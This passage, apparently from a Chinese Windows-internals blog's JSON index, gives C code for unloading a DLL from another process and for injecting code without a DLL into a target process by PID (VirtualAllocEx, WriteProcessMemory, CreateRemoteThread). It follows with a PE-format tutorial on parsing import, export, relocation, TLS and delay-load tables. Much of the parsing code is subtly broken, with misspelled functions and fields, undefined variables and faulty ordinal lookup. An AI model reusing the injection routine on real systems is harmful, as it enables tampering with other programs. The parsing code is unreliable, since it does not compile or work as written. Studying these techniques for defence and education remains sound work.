模块名称szExePath: 完整的模块的路径（包括路径和模块名称） 卸载DLL文件代码实现12345678910111213141516171819202122232425262728293031323334VOID UnInjectDll(DWORD dwPid, char* szDllName)&#123; if(dwPid == 0 || lstrlen(szDllName) == 0) &#123; return; &#125; // 拍摄进程快照，需要包含TlHelp32.h头文件 HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SANPMODULE, dwPid) MODULEENTRY32 me32; me32.dwSize = sizeof(me32); // 查找匹配的模块名 BOOL bRet = Module32First(hSnap, &amp;me32); while (bRet) &#123; if(lstrcmp(strupr(me32.szExePath), strupr(szDllName)) == 0) &#123; break; &#125; bRet = Module32Next(hSnap, &amp;me32); &#125; CloseHandle(hSnap); // 打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); // 获取FreeLibrary函数地址 FARPROC pFuncProcAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;FreeLibrary&quot;); // 卸载dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, me32.hModule, 0, NULL); // WaitForSingleObject(hThread, INFINITE); // 关闭句柄 CloseHandle(hProcess); CloseHandle(hThread); return;&#125; 无DLL的代码注入123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;iostream&gt;#include &lt;Windows.h&gt;constexpr auto STRLEN = 20;typedef struct _Data &#123; FARPROC dwLoadLibrary; FARPROC dwGetProcAddress; FARPROC dwGetModuleHandle; FARPROC dwGetModuleFileName; char User32Dll[STRLEN]; char MessageBox[STRLEN]; char Str[STRLEN];&#125;DATA, *PDATA;DWORD WINAPI RemoteThreadProc(LPVOID lpParam)&#123; PDATA pData = (PDATA)lpParam; // 定义API函数原型 HMODULE(__stdcall * MyLoadLibrary)(LPCTSTR); FARPROC(__stdcall * MyGetProcAddress)(HMODULE, LPCSTR); HMODULE(__stdcall * MyGetModuelHandle)(LPCTSTR); int(__stdcall * MyMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT); DWORD(__stdcall * MyGetModuleFileName)(HMODULE, LPTSTR, DWORD); // 对各函数地址进行赋值 MyLoadLibrary = (HMODULE(__stdcall*)(LPCTSTR))pData-&gt;dwLoadLibrary; MyGetProcAddress = (FARPROC(__stdcall*)(HMODULE, LPCSTR))pData-&gt;dwGetProcAddress; MyGetModuelHandle = (HMODULE(__stdcall*)(LPCTSTR))pData-&gt;dwGetModuleHandle; MyGetModuleFileName = (DWORD(__stdcall*)(HMODULE, LPTSTR, DWORD))pData-&gt;dwGetModuleFileName; // 加载user32.dll HMODULE hModule = MyLoadLibrary((LPCTSTR)pData-&gt;User32Dll); MyMessageBox = (int(__stdcall*)(HWND, LPCTSTR, LPCTSTR, UINT))MyGetProcAddress(hModule, pData-&gt;MessageBox); char szModuleFileName[MAX_PATH] = &#123; 0 &#125;; MyGetModuleFileName(hModule, (LPTSTR)szModuleFileName, MAX_PATH); MyMessageBox(NULL, (LPCTSTR)pData-&gt;Str, (LPCTSTR)szModuleFileName, MB_OK); return 0;&#125;VOID noDllInjectCode(DWORD dwPid)&#123; // 打开进程获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if (hProcess == NULL) &#123; printf(&quot;OpenProcess Failed\\n&quot;); return; &#125; DATA Data = &#123; 0 &#125;; // 获取kernel32.dll中相关的导出函数 Data.dwLoadLibrary = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;LoadLibraryA&quot;); Data.dwGetProcAddress = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;GetProcAddress&quot;); Data.dwGetModuleHandle = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;GetModuleHandleA&quot;); Data.dwGetModuleFileName = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;GetModuleFileNameA&quot;); // 需要其他DLL和导出函数 lstrcpy((LPSTR)Data.User32Dll, TEXT(&quot;user32.dll&quot;)); lstrcpy((LPSTR)Data.MessageBox, TEXT(&quot;MessageBoxA&quot;)); lstrcpy((LPSTR)Data.Str, TEXT(&quot;Dokey Inject Code&quot;)); // 在目标进程申请内存空间 LPVOID lpData = VirtualAllocEx(hProcess, NULL, sizeof(Data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpData == NULL) &#123; printf(&quot;VirtualAllocEx1 Failed\\n&quot;); return; &#125; // 将数据写入目标内存中 SIZE_T dwWriteLen = 0; BOOL bRet = WriteProcessMemory(hProcess, lpData, &amp;Data, sizeof(Data), &amp;dwWriteLen); if (bRet == FALSE) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return; &#125; // 在目标进程申请内存用于保存代码长度 DWORD dwFunction = 0x4000; LPVOID lpCode = VirtualAllocEx(hProcess, NULL, dwFunction, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpCode == NULL) &#123; printf(&quot;VirtualAllocEx2 Failed\\n&quot;); return; &#125; bRet = WriteProcessMemory(hProcess, lpCode, &amp;RemoteThreadProc, dwFunction, &amp;dwWriteLen); if (bRet == FALSE) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return; &#125; HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpCode, lpData, 0, NULL); if (hThread == NULL) &#123; printf(&quot;CreateRemoteThread Failed\\n&quot;); return; &#125; WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return;&#125;int main()&#123; noDllInjectCode(3076); system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows Inject","slug":"windows-Inject","permalink":"http://example.com/tags/windows-Inject/"}]},{"title":"数据目录表解析","slug":"数据目录表解析","date":"2023-05-09T13:40:35.000Z","updated":"2023-12-13T12:24:22.516Z","comments":true,"path":"9180d97d.html","link":"","permalink":"http://example.com/9180d97d.html","excerpt":"基础知识基地址(ImageBase): 当PE文件通过Windows加载器载入内存后，内存中的版本称为模块，映射文件的起始地址称为模块句柄，可通过句柄访问内存中其他数据结构，这个内存起始地址称为基地址。虚拟地址(VA): 在Windows系统中，PE文件被系统加载到内存后，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为虚拟地址。相对虚拟地址(RVA): 可执行文件中，有许多地方需要指定内存中的地址。例如，应用全局变量时需要指定它的地址。为了避免在PE文件中出现绝对内存地址引入了相对虚拟地址，它就是在内存中相对于PE文件载入地址的偏移量。文件偏移地址(FOA): 当PE文件存储在磁盘中时，某个数据的位置相对于文件头的偏移量称为文件偏移地址(FOA)。文件偏移地址从PE文件中的第一个字节开始计数，起始值为0。它们之间的关系：虚拟地址(VA) &#x3D; 基地址(ImageBase) + 相对虚拟地址(RVA)","text":"基础知识基地址(ImageBase): 当PE文件通过Windows加载器载入内存后，内存中的版本称为模块，映射文件的起始地址称为模块句柄，可通过句柄访问内存中其他数据结构，这个内存起始地址称为基地址。虚拟地址(VA): 在Windows系统中，PE文件被系统加载到内存后，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为虚拟地址。相对虚拟地址(RVA): 可执行文件中，有许多地方需要指定内存中的地址。例如，应用全局变量时需要指定它的地址。为了避免在PE文件中出现绝对内存地址引入了相对虚拟地址，它就是在内存中相对于PE文件载入地址的偏移量。文件偏移地址(FOA): 当PE文件存储在磁盘中时，某个数据的位置相对于文件头的偏移量称为文件偏移地址(FOA)。文件偏移地址从PE文件中的第一个字节开始计数，起始值为0。它们之间的关系：虚拟地址(VA) &#x3D; 基地址(ImageBase) + 相对虚拟地址(RVA) 数据目录表结构1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; // 虚拟地址，就是数据目录表的起始位置 DWORD Size; // 尺寸，起始地址 + 尺寸 = 结束的位置&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; Directory Entries12345678910111213141516#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory 导出表#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory 导入表#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory 资源表#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory 异常#define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory 安全#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table 重定位表#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory 调试信息// IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage)#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data 版权信息#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory TLS表#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers#define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table 导入函数地址表#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor 地址函数转换与PE结构有关的三种地址VA(虚拟地址)：PE文件映射到内存后的地址RVA(相对虚拟地址)：内存地址相对于映射基地址的偏移地址FileOffset(文件偏移地址)：相对PE文件在磁盘上的文件开头的偏移地址FOA &#x3D; RVA - HFOA &#x3D; VA - ImageBase - H 判断RVA是否在头部 FOA &#x3D; RVA 判断RVA位于哪个节 RVA &gt;&#x3D; Section[i]-&gt;VirtualAddress RVA &lt;&#x3D; Section[i]-&gt;VirtualAddress + 当前节内存对齐后的大小 FOA &#x3D; RVA - Section[i]-&gt;VirtualAddress + Section[i]-&gt;PointerToRawData 转换函数代码123456789101112131415161718192021222324DWORD RVAToFOA(DWORD dwRVA, char* buffer)&#123; // dwRVA 相对虚拟函数 buffer 已加载的文件内存映像 // DOS头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT 头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 区段 PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader); // 判断是否落在头部 if(dwRVA &lt; pSectionHeader[0].VirtualAddress) &#123; return dwRVA; &#125; for(int i = 0; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123; // 判断落在哪个区段 if(dwRVA &gt;= pSectionHeader[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize) &#123; return dwRVA - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData; &#125; &#125; return dwRVA;&#125; _IMAGE_IMPORT_DESCRIPTOR(导入表)IMAGE_IMPORT_DESCRIPTOR结构体123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; IMAGE_IMPORT_DESCRIPTOROriginalFirstThunk: 该字段指向导入名称表（INT）的RVA，该RVA指向的是一个IMAGE_THUNK_DATA的结构体TimeDateStamp: 该字段可以被忽略，一般为0即可ForwarderChain: 该字段一般为0Name: 该字段指向DLL名称的RVA地址FirstThunk: 该字段包含导入地址表（IAT）的RVA，IAT是一个IMAGE_THUNK_DATA的结构体数组 IMAGE_THUNK_DATA结构体123456789typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32; IMAGE_THUNK_DATAForwarderString: 是转向它的第一个索引的函数的名称的RVAFunction: 代表输入函数的地址Ordinal: 代表该函数在导入DLL中的序号。只有当IMAGE_THUNK_DATA的最高位为1时才代表使用序号导入，此时低31位代表在导入DLL中该函数的序号AddressOfData: 指向IMAGE_IMPORT_BY_NAME的一个指针，它表示用函数名进行导入。当IMAGE_THUNK_DATA的最高位为0时代表使用函数名进行导入，此时这四个字节代表着IMAGE_IMPORY_BY_NAME的RVA每一个IMAGE_THUNK_DATA对应一个DLL中的导入函数。IMAGE_THUNK_DATA与IMAGE_IMPORT_DESCRIPORT类似，同样是一个以全”0”的IMAGE_THUNK_DATA为结束当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式导入，这时低31位被看作一个导入序号。当其最高位为0时；表示函数以函数名称字符串的方式导入，这时DWORD的值表示一个RVA，并指向一个IMAGE_IMPORT_BY_NAME结构体 IMAGE_IMPORT_BY_NAME结构体1234typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; CHAR Name[1];&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; IMAGE_IMPORT_BY_NAMEHint: 该字段表示该函数在其导入表中的序号Name: 该字段表示导入函数的函数名。导入函数是一个以ASCII编码的字符串，并以NULL结尾。在IMAGE_IMPORT_BY_NAME中使用Name[1]来定义该字段，表示这是只有1个长度大小的字符串，但是函数名不可能只有一个字节的长度，通过越界访问来达到访问变长字符串的功能 注意IMAGE_IMPORT_DESCRIPTOR结构体中的OriginalFirstThunk和FirstThunk都指向了IMAGE_THUNK_DATA这个结构体，但是两者是有区别的。当文件在磁盘上时，两者指向的IMAGE_THUNK_DATA是相同的内容，而当文件被载入内存后，两者指向的就是不同的内容在磁盘上时，OriginalFirstThunk指向的IMAGE_THUNK_DATA中保存的是指向函数名的RVA，称其为INT。FirstThunk通常指向的IMAGE_THUNK_DATA中保存的也是指向函数名的RVA，它们在磁盘上是没有差异的当文件被载入内存后，OriginalFirstThunk指向的IMAGE_THUNK_DATA中保存的是指向函数名的RVA；FirstThunk通常指向的IMAGE_THUNK_DATA中由装载器填充的导入函数地址，称其为IAT。 解析导入表代码123456789101112131415161718192021222324252627282930313233DWORD PrintImportTable(char* buffer)&#123; // DOS 头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT 头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 定位导入表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT); // 填充结构体 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(RVAToFOV(pData.Dir.VirtualAddress, buffer) + buffer); while(pImport-&gt;Name) &#123; char* szDllName = (char*)(RVAToFOA(pImport-&gt;Name, buffer) + buffer); printf(&quot;DllName: %s\\n&quot;, szDllName); printf(&quot;TimeDateStamp：%08x\\n&quot;, pImport-&gt;TimeDateStamp); printf(&quot;ForwarderChain：%08x\\n&quot;, pImport-&gt;ForwarderChain); printf(&quot;Name Offset：%08x\\n&quot;, pImport-&gt;Name); printf(&quot;FirstThunk：%08x\\n&quot;, pImport-&gt;FirstThunk); printf(&quot;OriginalFirstThunk：%08x\\n\\n&quot;, pImport-&gt;OriginalFirstThunk); PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(RVAToFOA(pImport-&gt;FirstThunk, buffer) + buffer); while(pIAT-&gt;u1.Ordinal != 0) &#123; if(!IMAGE_SNAP_BY_ORDINAL32(pIAT-&gt;u1.Ordinal)) &#123; PIMAGE_IMPORT_BY_NAME pFunctionName = (PIMAGE_IMPORT_BY_NAME)(RVAToFOA(pIAT-&gt;u1.AddressOfData, buffer) + buffer); printf(&quot;Function Name: %s\\n&quot;, pFunctionName); &#125; pIAT++; &#125; pImport++ &#125;&#125; _IMAGE_EXPORT_DIRECTORY(导出表)IMAGE_EXPORT_DIRECTORY结构体12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; IMAGE_EXPORT_DIRECTORYCharacteristics: 保留，必须为0TimeDateStamp: 时间戳MajorVersion: 主要版本号，主要和次要版本号可由用户设置MinorVersion: 次要版本号Name: 名称RVA，包含导出文件名称的ASCII字符串地址Base: 此映像中导出的起始序号，指定导出地址表（AddressOfFunctions）的起始序号，通常设置为1NumberOfFunctions: 导出函数的个数，导出地址表（AddressOfFunctions）中的条目数NumberOfNames: 按名称导出的函数个数，名称表（AddressOfFunctions）中的条目数，同样也是序号表（AddressOfNameOrdinals）中的条目数AddressOfFunctions: 导出地址表RVAAddressOfNames: 导出名称表RVAAddressOfNameOrdinals: 序号表RVA 解析导出表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061void PrintExportTable(char* buffer)&#123; // DOS PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 定位导出表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); // 填充结构体 PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(RVAToFOA(pDataDir-&gt;VirtualAddress, buffer) + buffer); if (pExport-&gt;AddressFunctions == 0) &#123; printf(&quot;当前没有导出表!\\n&quot;); return; &#125; char* szDllName = (char*)(RVAToFOA(pExport-&gt;Name, buffer) + buffer); printf(&quot;DllName: %s\\n&quot;, DllName); printf(&quot;Base: %#08x\\n&quot;, pExport-&gt;Base); printf(&quot;NumberOfFunctions: %#08x\\n&quot;, pExport-&gt;NumberOfFunctions); printf(&quot;NumberOfNames: %#08x\\n&quot;, pExport-&gt;NumberOfNames); printf(&quot;AddressOfFunctions: %#08x\\n&quot;, pExport-&gt;AddressOfFunctions); printf(&quot;AddressOfNames: %#08x\\n&quot;, pExport-&gt;AddressOfNames); printf(&quot;AddressOfNameOrdinals: %#08x\\n&quot;, pExport-&gt;AddressOfNameOrdinals); // 函数数量 DWORD dwNumberOfFunctions = pExport-&gt;NumberOfFunctions; // 函数名数量 DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; // Base DWORD dwBase = pExport-&gt;Base; // 导出地址表 PDWORD pExportAddrTable = (PDWORD)(RVAToFOA(pExport-&gt;AddressOfFunctions, buffer) + buffer); // 导出名称表 PDWORD pExportNameTable = (PDWORD)(RVAToFOA(pExport-&gt;AddressOfNames, buffer) + buffer); // 导出序号表 PWORD pExportIdTable = (PWORD)(RVAToFOA(pExport-&gt;AddressOfNameOrdinals, buffer) + buffer); for(int i = 0; i &lt; dwNumberOfFunctions; i++) &#123; if(pExportAddrTable[i] == i) &#123; continue; &#125; DWORD id = 0; for (; id &lt; dwNumberOfNames; id++) &#123; if(pExportIdTable[i] == id) &#123; break; &#125; &#125; if (id == dwNumberOfNames) &#123; printf(&quot;ID: %x Address: %#08x Name[NULL]\\n&quot;, i + dwBase, pExportAddrTable[i]); &#125; else &#123; char* szFunName = (char*)(RVAToFileOffset(pExportNameTable[id], buffer) + buffer); printf(&quot;ID: %x Address: %#08x Name[%s]\\n&quot;, i + dwBase, pExportAddrTable[i], szFunName); &#125; &#125;&#125; _IMAGE_BASE_RELOCATION(重定位表)123456typedef struct _IMAGE_BASE_RELOCATION &#123; DWORD VirtualAddress; DWORD SizeOfBlock;// WORD TypeOffset[1];&#125; IMAGE_BASE_RELOCATION;typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; _IMAGE_BASE_RELOCATIONVirtualAddress: 指向需要重定位地址的RVA，每个INAGE_BASE_RELOCATION只负责4kb大小分页内的重定位信息。因此结构中的VirtualAddress值为0x1000的倍数SizeOfBlock: imageBase结构体和TypeOffset的总和 重定位块的大小TypeOffset[1]: 自定义的一个字段，表示这个结构体下面会出现WORD类型的数组，该数组元素的就是硬编码在程序当中的偏移自定义TypeOffset结构typedef struct _TYPE{ WORD Offset: 12; &#x2F;&#x2F; 大小2bit重定位的偏移 WORD Type: 4;} TYPE, *PTYPE; Windows的PE装载器进行PE重定位处理的操作原理流程在应用程序当中查找硬编码位置读取之后减去ImageBase，也就是用VA - 基址 &#x3D; RVA加上实际加载地址得到真正的VA其中最关键的就是找到硬编码的位置，而要找到硬编码的位置，首先要找到基址重定位表，该表位于.reloc区段，找到基址重定位表的正确打开方式是通过数据目录表IMAGE_DATA_DIRECTORY条目查找 解析重定位表123456789101112131415161718192021222324252627282930313233343536373839void PrintBaseRelocTable(char* buffer)&#123; // 自定义TypeOffset结构 typedef struct _TYPE&#123; WORD Offset: 12; WORD Type: 4; &#125; TYPE, *PTYPE; // DOS PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // SECTION Header PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRSET_SECTION(pNtHeader); // 定位重定位表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirtory + IMAGE_DIRECTORY_ENTRY_BASERELOC); // 填充结构体 PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)(RVAToFOA(pDataDir-&gt;VirtualAddress, buffer) + buffer); while(pBaseReloc-&gt;SizeOfBlock != 0) &#123; // 找到本0x1000个字节的起始位置 // 重定位个数 = （SizeOfBlock - 8（IMAGE_BASE_RELOCATION）） / 2（每个TypeOffset是2个字节） DWORD dwCount = (DWORD)(pBaseReloc-&gt;SizeOfBlock - 8) / 2; DWORD dwRVA = pBaseReloc-&gt;VirtualAddres; PTYPE pRelocAddr = (PTYPE)(pBaseReloc + 1); printf(&quot;SECTION: %#08X\\n&quot;, pSectionHeader-&gt;Name); printf(&quot;RVA: %#08X\\n&quot;, dwRVA); printf(&quot;ITEMS: %x H / %d D\\n&quot;, pBaseReloc-&gt;SizeOfBlock, pBaseReloc-&gt;SizeOfBlock); // 找到下一个0x1000个字节 pBaseReloc = (PIMAGE_BASE_RELOCATION)((char*)pBaseReloc + pBaseReloc-&gt;SizeOfBlock); for (int i = 0; i &lt; dwCount; i++) &#123; PDWORD pData = (PDWORD)(RVAToFOA(pRelocAddr[i].Offset + dwRVA, buffer) + buffer); DWORD pDataOffset = RVAToFOA(pRelocAddr[i].Offset + dwRVA, buffer); printf(&quot;SECTION: %#08x\\n&quot;, *pData); printf(&quot;RVA: %#08x\\n&quot;, pRelocAddr[i].Offset + dwRVA); printf(&quot;OFFSET: %#08x\\n\\n&quot;, pDataOffset); &#125; &#125;&#125; _IMAGE_TLS_DIRECTORY(TLS表)1234567891011121314151617typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; DWORD AddressOfIndex; // PDWORD DWORD AddressOfCallBacks; // PIMAGE_TLS_CALLBACK * DWORD SizeOfZeroFill; union &#123; DWORD Characteristics; struct &#123; DWORD Reserved0 : 20; DWORD Alignment : 4; DWORD Reserved1 : 8; &#125; DUMMYSTRUCTNAME; &#125; DUMMYUNIONNAME;&#125; IMAGE_TLS_DIRECTORY32;typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32; _IMAGE_TLS_DIRECTORY32StartAddressOfRawData: TLS初始化数据起始地址EndAddressOfRawData: TLS初始化结束地址，两个正好定位一个范围，范围放初始化的值AddressOfIndex: TLS索引位置AddressOfCallBacks: TLS回调函数的数组指针SizeOfZeroFill: 填充0的个数Characteristics: 保留TLS: 线程本地存储器，可以将数据与执行的特定线程联系起来。怎么理解？如果一个变量是全局的，那么所有线程访问的是同一份，某一个线程对其修改会影响其他所有线程。如果我们需要一个变量在每个线程中都能访问，并且值在每个线程中互不影响，这就是TLS。线程局部存储在不同平台有不同的实现，可移植性不好。线程局部存储不难实现，最简单的办法就是建立一个全局表，通过当前线程ID去查询相应的数据，因为各个线程ID不同，查到的数据自然也不同。 解析TLS表1234567891011121314151617void PrintTLSTable(char* buffer)&#123; // DOS PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 定位TLS表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.VirtualAddres + IMAGE_DIRECTORY_ENTRY_TLS); // 填充结构体 PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(RVAToFOA(pDataDir-&gt;VirtualAddress, buffer) + buffer); prinf(&quot;StartAddressOfRawData: %#08x\\n&quot;, pTLS-&gt;StartAddressOfRawData); prinf(&quot;EndAddressOfRawData: %#08x\\n&quot;, pTLS-&gt;EndAddressOfRawData); prinf(&quot;AddressOfIndex: %#08x\\n&quot;, pTLS-&gt;AddressOfIndex); prinf(&quot;AddressOfCallBacks: %#08x\\n&quot;, pTLS-&gt;AddressOfCallBacks); prinf(&quot;SizeOfZeroFill: %#08x\\n&quot;, pTLS-&gt;SizeOfZeroFill); prinf(&quot;Characteristics: %#08x\\n&quot;, pTLS-&gt;Characteristics);&#125; _IMAGE_DELAYLOAD_DESCRIPTOR(延时加载表)12345678910111213141516171819typedef struct _IMAGE_DELAYLOAD_DESCRIPTOR &#123; union &#123; DWORD AllAttributes; struct &#123; DWORD RvaBased : 1; // Delay load version 2 DWORD ReservedAttributes : 31; &#125; DUMMYSTRUCTNAME; &#125; Attributes; DWORD DllNameRVA; // RVA to the name of the target library (NULL-terminate ASCII string) DWORD ModuleHandleRVA; // RVA to the HMODULE caching location (PHMODULE) DWORD ImportAddressTableRVA; // RVA to the start of the IAT (PIMAGE_THUNK_DATA) DWORD ImportNameTableRVA; // RVA to the start of the name table (PIMAGE_THUNK_DATA::AddressOfData) DWORD BoundImportAddressTableRVA; // RVA to an optional bound IAT DWORD UnloadInformationTableRVA; // RVA to an optional unload info table DWORD TimeDateStamp; // 0 if not bound, // Otherwise, date/time of the target DLL&#125; IMAGE_DELAYLOAD_DESCRIPTOR, *PIMAGE_DELAYLOAD_DESCRIPTOR; 解析延时加载表1234567891011121314151617// DOSPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;// NTPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);// 定位DelayImportTablePIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT);// 填充结构体PIMAGE_DELAYLOAD_DESCRIPTOR pDelayLoad = (PIMAGE_DELAYLOAD_DESCRIPTOR)(RVAToFileOffset(pDataDir-&gt;VirtualAddress, buffer) + buffer);char* szDllName = (char*)(RVAToFileOffset(pDelayLoad-&gt;DllNameRVA, buffer) + buffer);printf(&quot;%s\\n&quot;, szDllName);printf(&quot;Attributes: %#08x\\n&quot;, pDelayLoad-&gt;Attributes);printf(&quot;ModuleHandleRVA: %#08x\\n&quot;, pDelayLoad-&gt;ModuleHandleRVA);printf(&quot;ImportAddressTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;ImportAddressTableRVA);printf(&quot;ImportNameTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;ImportNameTableRVA);printf(&quot;BoundImportAddressTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;BoundImportAddressTableRVA);printf(&quot;UnloadInformationTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;UnloadInformationTableRVA);printf(&quot;TimeDateStamp: %#08x\\n&quot;, pDelayLoad-&gt;TimeDateStamp);","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"Windows 